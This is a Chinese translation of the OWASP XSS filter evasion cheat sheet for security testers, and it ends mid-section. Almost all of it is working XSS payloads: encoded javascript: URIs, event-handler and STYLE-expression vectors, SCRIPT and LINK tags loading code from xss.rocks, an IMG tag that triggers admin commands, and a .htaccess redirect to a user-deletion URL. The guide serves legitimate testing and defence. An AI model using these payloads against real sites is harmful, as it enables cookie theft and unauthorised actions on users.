# XSS 过滤器绕过备忘录

## 引言

本文是为应用安全专业人士提供的跨站脚本（XSS）测试指南。这份备忘录最初基于 RSnake 的开创性 XSS 备忘录，之前位于：`http://ha.ckers.org/xss.html`。现在，OWASP 备忘录系列为用户提供了文档的更新和维护版本。第一个 OWASP 备忘录，[跨站脚本防御](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)，就是受到 RSnake 工作的启发，我们感谢 RSnake 的灵感！

## 测试

这份备忘录通过提供一系列可以绕过某些 XSS 防御过滤器的攻击，证明了输入过滤是防御 XSS 的不完整方法。

### 不使用过滤器绕过的基本 XSS 测试

这种攻击使用普通的 XSS JavaScript 注入，作为备忘录的基准（在任何现代浏览器中都不需要引号，因此这里省略了引号）：

```html
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
```

### XSS 定位器（多语言）

这个测试提供了一个"多语言测试 XSS 载荷"，可以在多个上下文中执行，包括 HTML、脚本字符串、JavaScript 和 URL：

```js
javascript:/*--></title></style></textarea></script></xmp>
<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
```

（基于 [Gareth Heyes](https://twitter.com/garethheyes) 的这条[推文](https://twitter.com/garethheyes/status/997466212190781445)）

### 格式不正确的 A 标签

这个测试跳过 `[href](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#href)` 属性，以演示使用事件处理程序的 XSS 攻击：

```js
\<a onmouseover="alert(document.cookie)"\>xxs 链接\</a\>
```

Chrome 会自动为你插入缺失的引号。如果遇到问题，尝试省略它们，Chrome 将在 URL 或脚本中正确放置缺失的引号：

```js
\<a onmouseover=alert(document.cookie)\>xxs 链接\</a\>
```

（由 David Cross 提交，在 Chrome 上验证）

### 格式不正确的 IMG 标签

这种 XSS 方法使用宽松的渲染引擎在 IMG 标签内创建 XSS 向量（需要用引号封装）。我们认为这种方法最初是为了纠正不严谨的编码，并且会使正确解析 HTML 标签变得更加困难：

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

（最初由 Begeek 发现，但已清理并缩短以在所有浏览器中工作）

### fromCharCode

如果系统不允许任何类型的引号，你可以在 JavaScript 中使用 `eval()` 的 `fromCharCode` 来创建你需要的任何 XSS 向量：

```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">点击我！</a>
```

### 默认 SRC 标签以绕过检查 SRC 域的过滤器

这种攻击将绕过大多数 SRC 域过滤器。在事件处理程序中插入 JavaScript 也适用于使用 Form、Iframe、Input、Embed 等元素的任何 HTML 标签注入。这还允许替换标签类型的任何相关事件，如 `onblur` 或 `onclick`，提供了这里列出的注入的广泛变体：

```html
<IMG SRC=# onmouseover="alert('xxs')">
```

（由 David Cross 提交，并由 Abdullah Hussam 编辑）

### 通过留空来设置默认 SRC 标签

```html
<IMG SRC= onmouseover="alert('xxs')">
```

### 通过完全省略来设置默认 SRC 标签

```html
<IMG onmouseover="alert('xxs')">
```

### 错误时警报

```html
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

### IMG onerror 和 JavaScript 警报编码

```html
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```

### 十进制 HTML 字符引用

由于在 `<IMG` 标签内使用 `javascript:` 指令的 XSS 示例在 Firefox 上不起作用，这种方法使用十进制 HTML 字符引用作为解决方案：

```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">点击我！</a>
```

### 没有尾随分号的十进制 HTML 字符引用

这通常可以绕过寻找 `&\#XX;` 字符串的 XSS 过滤器，因为大多数人不知道填充 - 可以使用最多 7 个数字字符。这对于针对解码字符串如 `$tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/;` 的过滤器也很有用，该过滤器错误地假定需要分号来终止 HTML 编码字符串（这在野外已经见过）：

```html
<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">点击我</a>
```

### 没有尾随分号的十六进制 HTML 字符引用

这种攻击对于过滤器字符串 `$tmp\_string=\~ s/.\*\\&\#(\\d+);.\*/$1/;` 也是可行的，因为它假定在井号后面必须有一个数字字符 - 而对于十六进制 HTML 字符来说，这是不正确的：

```html
<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">点击我</a>
```

### 嵌入制表符

这种方法可以分解 XSS 攻击：

<!-- markdownlint-disable MD010-->
```html
 <a href="jav	ascript:alert('XSS');">点击我</a>
```
<!-- markdownlint-enable MD010-->

### 嵌入编码制表符

这种方法也可以分解 XSS：

```html
 <a href="jav&#x09;ascript:alert('XSS');">点击我</a>
```

### 嵌入换行符以分解 XSS

虽然一些防御者声称字符 09-13（十进制）都可以用于此攻击，但这是不正确的。只有 09（水平制表符）、10（换行符）和 13（回车符）有效。请查看 [ASCII 表](https://man7.org/linux/man-pages/man7/ascii.7.html)作为参考。接下来的四个 XSS 攻击示例说明了这个向量：

```html
<a href="jav&#x0A;ascript:alert('XSS');">点击我</a>
```

#### 示例 1：使用嵌入的回车符分解 XSS 攻击

（注意：在上面的示例中，我故意使这些字符串比必要的长，因为可以省略零。我经常看到一些过滤器假定十六进制和十进制编码必须是两到三个字符。实际规则是 1-7 个字符。）：

```html
<a href="jav&#x0D;ascript:alert('XSS');">点击我</a>
```

#### 示例 2：使用空字符分解 JavaScript 指令

空字符也可以作为 XSS 向量，但不像上面那样，你需要直接注入它们，可以使用 Burp Proxy 或在 URL 字符串中使用 `%00`，或者如果你想编写自己的注入工具，可以使用 vim（`^V^@` 将产生空字符）或使用以下程序将其生成到文本文件中。空字符 `%00` 更有用，并且帮助我使用这个示例的变体绕过了某些真实世界的过滤器：

```sh
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

#### 示例 3：图像中 JavaScript 之前的空格和元字符

如果过滤器的模式匹配没有考虑 `javascript:` 一词中的空格（这是正确的，因为这不会渲染），但错误地假设引号和 `javascript:` 关键字之间不能有空格，这将很有用。实际情况是，你可以使用十进制 1-32 的任何字符：

```html
<a href=" &#14;  javascript:alert('XSS');">点击我</a>
```

#### 示例 4：非字母非数字 XSS

Firefox HTML 解析器假定 HTML 关键字后的非字母非数字字符无效，因此将其视为空白或 HTML 标签后的无效标记。问题是某些 XSS 过滤器假定它们正在寻找的标签被空白分隔。例如 `\<SCRIPT\\s` != `\<SCRIPT/XSS\\s`：

```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

基于上面的相同思路，但进行了扩展，使用 Rsnake 的模糊器。Gecko 渲染引擎允许在事件处理程序和等号之间使用除字母、数字和封装字符（如引号、尖括号等）之外的任何字符，使得绕过跨站点脚本块更加容易。注意，这也适用于重音符，如下所示：

```html
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

Yair Amit 指出，Trident（IE）和 Gecko（Firefox）渲染引擎之间存在略微不同的行为，允许在标签和参数之间仅使用斜杠且不带空格。如果系统不允许空格，这可能在攻击中很有用：

```html
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```

### 额外的开放括号

这个 XSS 向量可以击败某些检测引擎，这些引擎通过检查开放和闭合尖括号的匹配对，然后比较内部标签来工作，而不是使用更高效的算法，如 [Boyer-Moore](https://en.wikipedia.org/wiki/Boyer%E2%80%93Moore_string-search_algorithm)，后者会查找整个字符串匹配的开放尖括号和关联标签（当然是在去混淆后）。双斜杠注释掉结尾的多余括号，以抑制 JavaScript 错误：

```html
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

（由 Franz Sedlmaier 提交）

### 没有闭合脚本标签

对于 Firefox，你实际上不需要这个 XSS 向量的 `\></SCRIPT>` 部分，因为 Firefox 假定关闭 HTML 标签是安全的，并为你添加闭合标签。与下一个攻击不同，这种方法不会影响 Firefox，并且不需要其下方的任何额外 HTML。如果需要，可以添加引号，但通常不需要：

```html
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```

### 脚本标签中的协议解析

这个特殊的变体部分基于 Ozh 的协议解析绕过，并且在兼容模式下的 IE 和 Edge 中有效。然而，这在空间有限的情况下特别有用，当然，你的域名越短越好。`.j` 是有效的，无论编码类型如何，因为浏览器在 SCRIPT 标签的上下文中知道它：

```html
<SCRIPT SRC=//xss.rocks/.j>
```

（由 Łukasz Pilorz 提交）

### 半开放 HTML/JavaScript XSS 向量

与 Firefox 不同，IE 渲染引擎（Trident）不会向页面添加额外数据，但它确实允许在图像中使用 `javascript:` 指令。这作为一个向量很有用，因为它不需要闭合尖括号。这假设在你注入这个 XSS 向量的位置下方有任何 HTML 标签。即使没有闭合的 `\>` 标签，下面的标签也会将其关闭。注意：这会破坏 HTML，取决于下方的 HTML。它绕过了以下网络入侵检测系统（NIDS）正则表达式：`/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/`，因为它不需要结束的 `\>`。顺便说一句，这对使用开放式 `<IFRAME` 标签而不是 `<IMG` 标签的真实世界 XSS 过滤器也很有效。

```html
<IMG SRC="`<javascript:alert>`('XSS')"
```

### 转义 JavaScript 转义

如果一个应用程序被编写为在 JavaScript 中输出一些用户信息（如下所示：`<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`），并且你想在其中注入自己的 JavaScript，但服务器端应用程序转义了某些引号，你可以通过转义它们的转义字符来规避这一点。当这被注入时，它将读取 `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>`，最终取消转义双引号并触发 XSS 向量。XSS 定位器使用这种方法：

```js
\";alert('XSS');//
```

另一种方法，如果已正确应用了 JSON 或 JavaScript 转义，但没有 HTML 编码，是结束脚本块并启动自己的脚本块：

```js
</script><script>alert('XSS');</script>
```

### 结束标题标签

这是一个简单的 XSS 向量，关闭 `<TITLE>` 标签，可以封装恶意的跨站点脚本攻击：

```html
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```

#### INPUT 图像

```html
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

#### BODY 图像

```html
<BODY BACKGROUND="javascript:alert('XSS')">
```

#### IMG Dynsrc

```html
<IMG DYNSRC="javascript:alert('XSS')">
```

#### IMG Lowsrc

```html
<IMG LOWSRC="javascript:alert('XSS')">
```

### 列表样式图像

这种深奥的攻击专注于嵌入项目符号列表的图像。由于 JavaScript 指令，它只能在 IE 渲染引擎中工作。不是一个特别有用的 XSS 向量：

```html
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```

### 图像中的 VBscript

```html
<IMG SRC='vbscript:msgbox("XSS")'>
```

### SVG 对象标签

```js
<svg/onload=alert('XSS')>
```

### ECMAScript 6

```js
Set.constructor`alert\x28document.domain\x29
```

### BODY 标签

这种攻击不需要使用 `javascript:` 或 `<SCRIPT...` 的任何变体来完成 XSS 攻击。Dan Crowley 指出，你可以在等号前放置一个空格（`onload=` != `onload =`）：

```html
<BODY ONLOAD=alert('XSS')>
```

#### 使用事件处理程序的攻击

BODY 标签的攻击可以修改用于类似于上面的 XSS 攻击（在撰写本文时，这是网络上最全面的列表）。感谢 Rene Ledosquet 提供 HTML+TIME 更新。

# JavaScript 事件处理程序列表

[Dottoro Web 参考](http://help.dottoro.com/)还提供了一个很好的 [JavaScript 事件列表](http://help.dottoro.com/ljfvvdnm.php)。

- `onAbort()`（当用户中止图像加载时）
- `onActivate()`（当对象被设置为活动元素时）
- `onAfterPrint()`（在用户打印或预览打印作业后激活）
- `onAfterUpdate()`（在源对象中更新数据后在数据对象上激活）
- `onBeforeActivate()`（在对象被设置为活动元素之前触发）
- `onBeforeCopy()`（攻击者在选择被复制到剪贴板之前执行攻击字符串 - 攻击者可以使用 `execCommand("Copy")` 函数来做到这一点）
- `onBeforeCut()`（攻击者在选择被剪切之前执行攻击字符串）
- `onBeforeDeactivate()`（在当前对象的活动元素更改后立即触发）
- `onBeforeEditFocus()`（在可编辑元素中的对象进入 UI 激活状态之前触发，或当可编辑容器对象被控制选择时）
- `onBeforePaste()`（需要诱使用户粘贴或使用 `execCommand("Paste")` 函数强制粘贴）
- `onBeforePrint()`（需要诱使用户打印，或攻击者可以使用 `print()` 或 `execCommand("Print")` 函数）
- `onBeforeUnload()`（需要诱使用户关闭浏览器 - 攻击者无法卸载窗口，除非它是从父窗口生成的）
- `onBeforeUpdate()`（在源对象中更新数据之前在数据对象上激活）
- `onBegin()`（当元素的时间线开始时立即触发）
- `onBlur()`（在加载另一个弹出窗口并且窗口失去焦点的情况下）
- `onBounce()`（当 marquee 对象的行为属性设置为"alternate"且 marquee 内容到达窗口一侧时触发）
- `onCellChange()`（当数据提供者中的数据发生变化时触发）
- `onChange()`（选择、文本或 TEXTAREA 字段失去焦点且其值已被修改）
- `onClick()`（有人点击表单）
- `onContextMenu()`（用户需要右键点击攻击区域）
- `onControlSelect()`（当用户即将选择对象的控件时触发）
- `onCopy()`（用户需要复制某些内容，或可以使用 `execCommand("Copy")` 命令利用）
- `onCut()`（用户需要复制某些内容，或可以使用 `execCommand("Cut")` 命令利用）
- `onDataAvailable()`（用户需要更改元素中的数据，或攻击者可以执行相同的功能）
- `onDataSetChanged()`（当数据源对象公开的数据集发生变化时触发）
- `onDataSetComplete()`（表示从数据源对象获取所有数据时触发）
- `onDblClick()`（用户双击表单元素或链接）
- `onDeactivate()`（当活动元素从当前对象更改为父文档中的另一个对象时触发）
- `onDrag()`（需要用户拖动对象）
- `onDragEnd()`（需要用户拖动对象）
- `onDragLeave()`（需要用户将对象从有效位置拖走）
- `onDragEnter()`（需要用户将对象拖到有效位置）
- `onDragOver()`（需要用户将对象拖到有效位置）
- `onDragDrop()`（用户将对象（例如文件）放到浏览器窗口上）
- `onDragStart()`（当用户开始拖动操作时发生）
- `onDrop()`（用户将对象（例如文件）放到浏览器窗口上）
- `onEnd()`（当时间线结束时触发）
- `onError()`（加载文档或图像导致错误）
- `onErrorUpdate()`（当数据绑定对象在更新数据源对象中的关联数据时发生错误时触发）
- `onFilterChange()`（当视觉过滤器完成状态更改时触发）
- `onFinish()`（攻击者可以在 marquee 完成循环时创建漏洞）
- `onFocus()`（当窗口获得焦点时，攻击者执行攻击字符串）
- `onFocusIn()`（当窗口获得焦点时，攻击者执行攻击字符串）
- `onFocusOut()`（当窗口失去焦点时，攻击者执行攻击字符串）
- `onHashChange()`（当文档当前地址的片段标识符部分发生变化时触发）
- `onHelp()`（当用户在窗口聚焦时按 F1 时，攻击者执行攻击字符串）
- `onInput()`（通过用户界面更改元素的文本内容）
- `onKeyDown()`（用户按下一个键）
- `onKeyPress()`（用户按下或按住一个键）
- `onKeyUp()`（用户释放一个键）
- `onLayoutComplete()`（用户必须打印或预览打印）
- `onLoad()`（窗口加载后，攻击者执行攻击字符串）
- `onLoseCapture()`（可以通过 `releaseCapture()` 方法利用）
- `onMediaComplete()`（使用流媒体文件时，此事件可能在文件开始播放之前触发）
- `onMediaError()`（用户在浏览器中打开包含媒体文件的页面，并且在出现问题时触发事件）
- `onMessage()`（当文档收到消息时触发）
- `onMouseDown()`（攻击者需要让用户点击图像）
- `onMouseEnter()`（光标移动到对象或区域上）
- `onMouseLeave()`（攻击者需要让用户将鼠标移动到图像或表格上，然后移开）
- `onMouseMove()`（攻击者需要让用户将鼠标移动到图像或表格上）
- `onMouseOut()`（攻击者需要让用户将鼠标移动到图像或表格上，然后移开）
- `onMouseOver()`（光标移动到对象或区域上）
- `onMouseUp()`（攻击者需要让用户点击图像）
- `onMouseWheel()`（攻击者需要让用户使用鼠标滚轮）
- `onMove()`（用户或攻击者移动页面）
- `onMoveEnd()`（用户或攻击者移动页面）
- `onMoveStart()`（用户或攻击者移动页面）
- `onOffline()`（如果浏览器在在线模式下工作并开始离线工作）
- `onOnline()`（如果浏览器在离线模式下工作并开始在线工作）
- `onOutOfSync()`（中断元素按照时间线定义播放其媒体的能力）
- `onPaste()`（用户需要粘贴，或攻击者可以使用 `execCommand("Paste")` 函数）
- `onPause()`（当时间线暂停时，在所有活动元素上触发，包括 body 元素）
- `onPopState()`（当用户导航会话历史时触发）
- `onPropertyChange()`（用户或攻击者需要更改元素属性）
- `onReadyStateChange()`（用户或攻击者需要更改元素属性）
- `onRedo()`（用户在撤销事务历史中向前移动）
- `onRepeat()`（为时间线的每次重复触发一次事件，不包括第一个完整周期）
- `onReset()`（用户或攻击者重置表单）
- `onResize()`（用户调整窗口大小；攻击者可以使用类似 `<SCRIPT>self.resizeTo(500,400);</SCRIPT>` 的方式自动初始化）
- `onResizeEnd()`（用户调整窗口大小；攻击者可以使用类似 `<SCRIPT>self.resizeTo(500,400);</SCRIPT>` 的方式自动初始化）
- `onResizeStart()`（用户调整窗口大小；攻击者可以使用类似 `<SCRIPT>self.resizeTo(500,400);</SCRIPT>` 的方式自动初始化）
- `onResume()`（当时间线恢复时，在所有变为活动的元素上触发，包括 body 元素）
- `onReverse()`（如果元素的 repeatCount 大于 1，则每次时间线开始向后播放时触发）
- `onRowsEnter()`（用户或攻击者需要更改数据源中的行）
- `onRowExit()`（用户或攻击者需要更改数据源中的行）
- `onRowDelete()`（用户或攻击者需要删除数据源中的行）
- `onRowInserted()`（用户或攻击者需要在数据源中插入行）
- `onScroll()`（用户需要滚动，或攻击者可以使用 `scrollBy()` 函数）
- `onSeek()`（当时间线设置为以除向前以外的任何方向播放时，`onReverse` 事件触发）
- `onSelect()`（用户需要选择一些文本 - 攻击者可以使用类似 `window.document.execCommand("SelectAll");` 的方式自动初始化）
- `onSelectionChange()`（用户需要选择一些文本 - 攻击者可以使用类似 `window.document.execCommand("SelectAll");` 的方式自动初始化）
- `onSelectStart()`（用户需要选择一些文本 - 攻击者可以使用类似 `window.document.execCommand("SelectAll");` 的方式自动初始化）
- `onStart()`（在每个 marquee 循环开始时触发）
- `onStop()`（用户需要按停止按钮或离开网页）
- `onStorage()`（存储区域发生变化）
- `onSyncRestored()`（用户中断元素按照时间线定义播放其媒体的能力）
- `onSubmit()`（需要攻击者或用户提交表单）
- `onTimeError()`（用户或攻击者将时间属性（如 dur）设置为无效值）
- `onTrackChange()`（用户或攻击者在播放列表中更改轨道）
- `onUndo()`（用户在撤销事务历史中向后移动）
- `onUnload()`（当用户点击任何链接或按下返回按钮，或攻击者强制点击时）
- `onURLFlip()`（当由 HTML+TIME（定时交互多媒体扩展）媒体标签播放的高级流媒体格式（ASF）文件处理嵌入在 ASF 文件中的脚本命令时触发）
- `seekSegmentTime()`（这是一个方法，用于定位元素段时间线上的指定点并从该点开始播放。段由一个重复周期的时间线组成，包括使用 AUTOREVERSE 属性的反向播放。）

### BGSOUND

```js
<BGSOUND SRC="javascript:alert('XSS');">
```

### & JavaScript 包含

```html
<BR SIZE="&{alert('XSS')}">
```

### 样式表

```html
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

### 远程样式表

使用像远程样式表这样简单的方法，你可以包含你的 XSS，因为样式参数可以使用嵌入式表达式重新定义。这只在 IE 中有效。请注意，页面上没有任何内容表明包含了 JavaScript。注意：所有这些远程样式表示例都使用 body 标签，因此除非页面上有除向量本身之外的一些内容，否则它不会起作用，所以如果是一个空白页，你需要添加一个单字母使其生效：

```html
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```

### 远程样式表 第2部分

这与上面的工作方式相同，但使用 `<STYLE>` 标签而不是 `<LINK>` 标签。这个向量的轻微变体曾被用于黑入 Google Desktop。顺便说一句，如果向量后面紧接着 HTML 可以关闭它，你可以删除结束 `</STYLE>` 标签。如果在跨站点脚本攻击中不能使用等号或斜杠，这很有用，这在现实世界中至少发生过一次：

```html
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```

### 远程样式表 第3部分

这只在 Gecko 渲染引擎中有效，通过将 XUL 文件绑定到父页面来工作。

```html
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```

### 打断 JavaScript 的 STYLE 标签

这个 XSS 有时会使 IE 进入无限的警报循环：

```html
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```

### 打断表达式的 STYLE 属性

```html
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

（由 Roman Ivanov 创建）

### 带有表达式的 IMG STYLE

这实际上是最后两个 XSS 向量的混合，但它确实显示了 STYLE 标签解析有多困难。这可以使 IE 进入循环：

```html
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```

### 使用背景图像的 STYLE 标签

```html
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
```

### 使用背景的 STYLE 标签

```html
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
<STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```

### 带有 STYLE 属性的匿名 HTML

IE 渲染引擎并不真正关心你构建的 HTML 标签是否存在，只要它以开放的尖括号和一个字母开头：

```html
<XSS STYLE="xss:expression(alert('XSS'))">
```

### 本地 htc 文件

这与最后两个 XSS 向量有点不同，因为它使用了必须与 XSS 向量在同一服务器上的 .htc 文件。这个示例文件通过拉入 JavaScript 并作为样式属性的一部分运行来工作：

```html
<XSS STYLE="behavior: url(xss.htc);">
```

### US-ASCII 编码

这种攻击使用了 7 位而不是 8 位的畸形 ASCII 编码。这种 XSS 方法可能绕过许多内容过滤器，但仅在主机以 US-ASCII 编码传输或你自己设置编码时有效。这对于绕过 Web 应用程序防火墙（WAF）的 XSS 规避比服务器端过滤器规避更有用。Apache Tomcat 是已知的唯一默认仍以 US-ASCII 编码传输的服务器。

```js
¼script¾alert(¢XSS¢)¼/script¾
```

### META

元刷新奇怪的地方在于它不在标头中发送引用者 - 因此可以用于某些类型的攻击，在这些攻击中你需要摆脱引用 URL：

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```

#### 使用数据的 META

指令 URL 方案。这种攻击方法很好，因为它没有任何可见的内容包含 SCRIPT 一词或 JavaScript 指令，因为它利用了 base64 编码。请参阅 [RFC 2397](https://datatracker.ietf.org/doc/html/rfc2397) 了解更多详情。

```html
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```

#### 带有额外 URL 参数的 META

"如果目标网站尝试查看 URL 是否以 `<http://>;` 开头，你可以使用以下技术绕过此过滤规则：

```html
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
```

（由 Moritz Naumann 提交）

### IFRAME

如果允许 iFrame，还会出现许多其他 XSS 问题：

```html
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```

### 基于事件的 IFRAME

IFrame 和大多数其他元素可以使用基于事件的混乱，如下所示：

```html
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```

（由 David Cross 提交）

### FRAME

Frame 与 iFrame 有相同类型的 XSS 问题

```html
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```

### TABLE

```html
<TABLE BACKGROUND="javascript:alert('XSS')">
```

#### TD

与上面类似，TD 的背景也容易受到包含 JavaScript XSS 向量的影响：

```html
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```

### DIV

#### DIV 背景图像

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

#### 带有 Unicode XSS 漏洞的 DIV 背景图像

这已稍微修改以混淆 URL 参数：

```html
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```

（原始漏洞由 Renaud Lifchitz 发现，是 Hotmail 中的一个漏洞）

#### DIV 背景图像加额外字符

RSnake 构建了一个快速的 XSS 模糊器，用于检测 IE 中开放括号后但在 JavaScript 指令之前允许的任何错误字符。这些是十进制的，但你可以包含十六进制并添加填充。（可以使用以下任何字符：1-32, 34, 39, 160, 8192-8.13, 12288, 65279）：

```html
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

#### DIV 表达式

这种攻击的变体通过在冒号和 `expression` 之间使用换行，对真实世界的 XSS 过滤器有效：

```html
<DIV STYLE="width: expression(alert('XSS'));">
```

### 低级隐藏块

仅在 IE 渲染引擎 - Trident 上有效。一些网站认为注释块内的任何内容都是安全的，因此不需要删除，这允许我们的 XSS 向量存在。或者系统可能会尝试在某些内容周围添加注释标签，以徒劳地使其无害。正如我们所见，这可能无法奏效：

```js
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>
<![endif]-->
```

### BASE 标签

（在安全模式下在 IE 上有效）这种攻击需要 `//` 来注释掉下一个字符，这样你就不会得到 JavaScript 错误，并且你的 XSS 标签将呈现。另外，这依赖于许多网站使用动态放置的图像，如 `images/image.jpg` 而不是完整路径。如果路径包含前导正斜杠，如 `/images/image.jpg`，你可以从这个向量中删除一个斜杠（只要一开始有两个，这将起作用）：

```html
<BASE HREF="javascript:alert('XSS');//">
```

### OBJECT 标签

如果系统允许对象，你还可以使用 APPLET 标签注入病毒有效载荷，可以感染用户等。链接的文件实际上是一个 HTML 文件，可以包含你的 XSS：

```html
<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```

### 包含 XSS 向量的嵌入 SVG

这种攻击仅在 Firefox 中有效：

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```

（感谢 nEUrOO 提供这个）

### 带有 CDATA 混淆的 XML 数据岛

这种 XSS 攻击仅在 IE 中有效：

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```

### 带有嵌入 JavaScript 的本地托管 XML，使用 XML 数据岛生成

这种攻击与上面几乎相同，但它引用了一个本地托管（在同一服务器上）的 XML 文件，该文件将保存你的 XSS 向量。你可以在这里看到结果：

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```

### HTML+TIME in XML

这种攻击仅在 IE 中有效，请记住你需要在 HTML 和 BODY 标签之间：

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
```

（这就是 Grey Magic 黑入 Hotmail 和 Yahoo 的方式！）

### 假设只能插入几个字符并且过滤 `.js`

这种攻击允许你将 JavaScript 文件重命名为图像作为 XSS 向量：

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```

### SSI（服务器端包含）

这需要在服务器上安装 SSI 才能使用这个 XSS 向量。我可能不需要提及，但如果你可以在服务器上运行命令，毫无疑问会有更严重的问题：

```js
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```

### PHP

这种攻击需要在服务器上安装 PHP。再次强调，如果你可以远程运行任何脚本，可能会有更严重的问题：

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```

### IMG 嵌入命令

这种攻击仅在注入（如网页论坛）到受密码保护的网页中并且密码保护对同一域上的其他命令有效时起作用。这可用于删除用户、添加用户（如果访问页面的用户是管理员）、将凭据发送到其他地方等。这是较少使用但更有用的 XSS 向量之一：

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```

#### IMG 嵌入命令 第二部分

这更可怕，因为没有任何标识符使其看起来可疑，除了它不是托管在你自己的域上。该向量使用 302 或 304（其他也可以）将图像重定向回命令。所以一个普通的 `<IMG SRC="httx://badguy.com/a.jpg">` 实际上可能是运行命令的攻击向量，作为查看图像链接的用户。以下是在 Apache 下实现该向量的 `.htaccess` 行：

```log
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```

（感谢 Timo 提供部分内容）

### Cookie 操纵

这种方法相当晦涩，但在一些允许 `<META` 并可用于覆盖 Cookie 的示例中。还有其他站点的示例，它们不是从数据库获取用户名，而是将用户名存储在 Cookie 中，仅对访问页面的用户显示。结合这两种场景，你可以修改受害者的 Cookie，这将作为 JavaScript 显示回给他们（你还可以用此方法注销用户、更改其用户状态、让他们以你的身份登录等）：

```html
